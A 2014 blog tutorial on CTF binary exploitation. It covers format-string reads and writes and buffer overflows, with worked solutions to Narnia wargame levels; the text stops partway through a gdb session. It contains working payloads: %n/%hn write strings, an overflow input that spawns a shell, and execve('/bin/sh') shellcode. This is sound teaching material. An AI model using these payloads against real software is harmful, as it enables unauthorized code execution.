
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Learning From CTF : Binary Exploitation - tech.bitvijays.com</title>
  <meta name="author" content="Vijay Kumar">

  
  <meta name="description" content="This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s. Let's start with some &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <link href="/atom.xml" rel="alternate" title="tech.bitvijays.com" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">tech.bitvijays.com</a></h1>
  
    <h2>The Magic of Learning.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:bitvijays.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About Me</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Learning From CTF : Binary Exploitation</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-09T20:42:01+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:42 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s.</p>

<!-- more -->




<ol>
Let&#8217;s start with some concepts and then we would see some examples which would help to clear the concepts.
<li>
Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
<br>
<img class="left" src="/images/big-endian.png" width="250" height="250">
<img class="right" src="/images/little-endian.png" width="250" height="250">
</li>
<br><br><br><br><br><br><br><br><br>
<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
<ul>
<li>Executable binary is running on whether x86 or x86-64.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uname -a</span></code></pre></td></tr></table></div></figure>
</li>
<li>Whether the binary is compiled for 32 bit or 64 bit.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file binary_file</span></code></pre></td></tr></table></div></figure>
</li>
<li>Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE) can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.
</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it&#8217;s executable.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10</span></code></pre></td></tr></table></div></figure>
</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb to create a random pattern which can be used to find the offset and pattern_offset.rb to find the exact offset. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb 200
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</span><span class='line'>
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>

</li>
<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run gdb &lt;program&gt;
</span><span class='line'>p &&lt;variablename&gt;</span></code></pre></td></tr></table></div></figure> </li>
</ul>
</li>


<li>Format String Vulnerability:

<ul>
<li>Definition: If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("The magic number is: %d\n", 1911);</span></code></pre></td></tr></table></div></figure>
</li>

<li>The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);</span></code></pre></td></tr></table></div></figure>
From within the printf function the stack looks like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>stack top
</span><span class='line'>. . .
</span><span class='line'>&lt;&a&gt;
</span><span class='line'>&lt;a&gt;
</span><span class='line'>&lt;i&gt;
</span><span class='line'>A
</span><span class='line'>. . .
</span><span class='line'>stack bottom</span></code></pre></td></tr></table></div></figure></li>
<li>Crashing the Program: By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%s%s%s%s%s%s%s%s%s%s%s%s");</span></code></pre></td></tr></table></div></figure>
Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</li>
<li>Viewing the stack: how some parts of the stack memory by using a format string like this: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%08x.%08x.%08x.%08x.%08x\n");</span></code></pre></td></tr></table></div></figure>
This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>40012980.080628c4.bffff7a4.00000005.08059c04</span></code></pre></td></tr></table></div></figure>
This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.</li>

<li>Viewing Memory at any location: It is possible to peek at memory locations different from the stack memory. To do this we have to get the format function to display memory from an address we can supply. This poses two problems to us: First, we have to find a format parameter which uses an address (by reference) as stack parameter and displays memory from there, and we have to supply that address. We are lucky in the first case, since the ‘%s’ parameter just does that, it displays memory — usually an ASCIIZ string — from a stack-supplied address. So the remaining problem is, how to get that address on the stack, into the right place.

Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. 2 The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");</span></code></pre></td></tr></table></div></figure>
The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.
In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>address = 0x08480110
</span><span class='line'>address (encoded as 32 bit le string): "\x10\x01\x48\x08" 
</span><span class='line'>printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");</span></code></pre></td></tr></table></div></figure>
Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.
</li>

<li>Overwriting of Arbitrary Memory: There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) 
at the address: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"</span></code></pre></td></tr></table></div></figure>
The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit. </li>

<li>Direct Parameter Access: The direct parameter access is controlled by the ‘$’ qualifier: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%6$d\n", 6, 5, 4, 3, 2, 1);</span></code></pre></td></tr></table></div></figure> Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.
</li>

<li>We can write two bytes by %hn and one byte by %hhn.</li>
<li> How to write four bytes?
Suppose we need to write 0x8048706 to the address 0xffffd64c.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>
</li>
</ul>


Aanother example of picoctf 2014, best_shell can be read at <a href="https://ctf-team.vulnhub.com/picoctf-2014-best-shell/">Best shell</a>.

</li>
</ol>


<h3>Examples</h3>

<ol>
<li>
Let&#8217;s see a simple example of binary exploitation <strong>Narnia0</strong>where we have to write a written value.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 &#8220;A&#8221; and the address it won&#8217;t work as the val doesn&#8217;t matches. So, we have to use python print command.
If we use 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
</li>


<li>In another example below <strong>Narnia1</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="nb">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="n">NULL</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
We need to set a environment variable EGG with an shellcode. Previously, I tried with
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\b</span><span class="s">in\sh&quot;</span>
</span><span class='line'><span class="ow">and</span>
</span><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>
Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that
if I write
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\xCC&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
It should sigtrap. &#8220;\xCC&#8221; acts as a software breakpoint, basically an INT3,  It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you&#8217;re good to go, and it&#8217;s a good way to make sure you&#8217;ve properly redirected execution to your shellcode. You can further put &#8220;\xCC&#8221; anywhere in the shellcode, if it crashes before &#8220;\xCC&#8221;, you know for sure that your shellcode has bad characters.
They suggested to export the EGG variable as
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
and it worked like a charm.
</li>

<li>
In another example <strong>Narnia2</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'>  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
It&#8217;s to easy that buffer overflow vulnerability exists because of strcpy. Let&#8217;s see what is the offset for this.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ ulimit -c unlimited
</span><span class='line'>bitvijays@kali:~$ ./narnia2 `/usr/share/metasploit-framework/tools/pattern_create.rb 200`
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>
</span><span class='line'>bitvijays@kali:~$ gdb -q -c core ./narnia2
</span><span class='line'>#0  0x37654136 in ?? ()
</span><span class='line'>
</span><span class='line'>bitvijays@kali:~$ /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140
</span><span class='line'>narnia2@melinda:~$ gdb -q /narnia/narnia2
</span><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x0804845d &lt;+0&gt;: push   %ebp
</span><span class='line'>   0x0804845e &lt;+1&gt;: mov    %esp,%ebp
</span><span class='line'>   0x08048460 &lt;+3&gt;: and    $0xfffffff0,%esp
</span><span class='line'>   0x08048463 &lt;+6&gt;: sub    $0x90,%esp
</span><span class='line'>   0x08048469 &lt;+12&gt;:    cmpl   $0x1,0x8(%ebp)
</span><span class='line'>   0x0804846d &lt;+16&gt;:    jne    0x8048490 &lt;main+51&gt;
</span><span class='line'>   0x0804846f &lt;+18&gt;:    mov    0xc(%ebp),%eax
</span><span class='line'>   0x08048472 &lt;+21&gt;:    mov    (%eax),%eax
</span><span class='line'>   0x08048474 &lt;+23&gt;:    mov    %eax,0x4(%esp)
</span><span class='line'>   0x08048478 &lt;+27&gt;:    movl   $0x8048560,(%esp)
</span><span class='line'>   0x0804847f &lt;+34&gt;:    call   0x8048310 &lt;printf@plt&gt;
</span><span class='line'>   0x08048484 &lt;+39&gt;:    movl   $0x1,(%esp)
</span><span class='line'>   0x0804848b &lt;+46&gt;:    call   0x8048340 &lt;exit@plt&gt;
</span><span class='line'>   0x08048490 &lt;+51&gt;:    mov    0xc(%ebp),%eax
</span><span class='line'>   0x08048493 &lt;+54&gt;:    add    $0x4,%eax
</span><span class='line'>   0x08048496 &lt;+57&gt;:    mov    (%eax),%eax
</span><span class='line'>   0x08048498 &lt;+59&gt;:    mov    %eax,0x4(%esp)
</span><span class='line'>   0x0804849c &lt;+63&gt;:    lea    0x10(%esp),%eax
</span><span class='line'>   0x080484a0 &lt;+67&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484a3 &lt;+70&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
</span><span class='line'>   0x080484a8 &lt;+75&gt;:    lea    0x10(%esp),%eax
</span><span class='line'>   0x080484ac &lt;+79&gt;:    mov    %eax,0x4(%esp)
</span><span class='line'>   0x080484b0 &lt;+83&gt;:    movl   $0x8048574,(%esp)
</span><span class='line'>   0x080484b7 &lt;+90&gt;:    call   0x8048310 &lt;printf@plt&gt;
</span><span class='line'>   0x080484bc &lt;+95&gt;:    mov    $0x0,%eax
</span><span class='line'>   0x080484c1 &lt;+100&gt;:   leave  
</span><span class='line'>   0x080484c2 &lt;+101&gt;:   ret    
</span><span class='line'>End of assembler dump.
</span><span class='line'>(gdb) br *main+70
</span><span class='line'>Breakpoint 1 at 0x80484a3
